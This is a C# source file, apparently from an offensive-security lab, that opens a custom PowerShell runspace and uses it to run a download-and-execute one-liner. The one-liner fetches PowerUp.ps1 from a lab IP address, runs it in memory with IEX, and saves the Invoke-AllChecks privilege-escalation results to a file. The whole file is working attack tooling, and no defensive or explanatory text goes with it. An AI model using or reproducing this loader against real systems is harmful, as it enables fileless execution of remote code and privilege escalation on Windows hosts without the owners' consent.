using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace custon_runspaces
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.71/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
